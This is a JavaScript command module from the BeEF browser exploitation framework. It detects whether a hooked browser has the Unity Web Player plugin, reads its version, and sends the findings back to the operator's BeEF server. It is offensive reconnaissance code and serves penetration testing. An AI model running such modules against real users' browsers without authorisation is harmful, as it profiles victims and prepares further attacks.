//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	
	var hasUnity = function() {
		
		// Internet Explorer
		if ( beef.browser.isIE() ) {
			
			try {
					var unity_test = new ActiveXObject('UnityWebPlayer.UnityWebPlayer.1');
				} catch (e) { }
				
			if ( unity_test ) {
				return true;
			}
		
		// Not Internet Explorer	
		} else if ( navigator.mimeTypes && navigator.mimeTypes["application/vnd.unity"] ) {
			
			if ( navigator.mimeTypes["application/vnd.unity"].enabledPlugin &&
	            navigator.plugins &&
				navigator.plugins["Unity Player"] ) {

				return true;

				}
			
		}
		
		return false;		
	
	}
	
	
	
	if ( hasUnity() ) {
		
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "unity = Unity Web Player is enabled");
		
		if ( !beef.browser.isIE() ) {
			
			var unityRegex = /Unity Web Player version (.*). \(c\)/g;
			var match = unityRegex.exec(navigator.plugins["Unity Player"].description);
			
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "unity version = "+ match[1]);
			
		}
		
	} else {
		
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "unity = Unity Web Player is not enabled");
	
	}
	
});
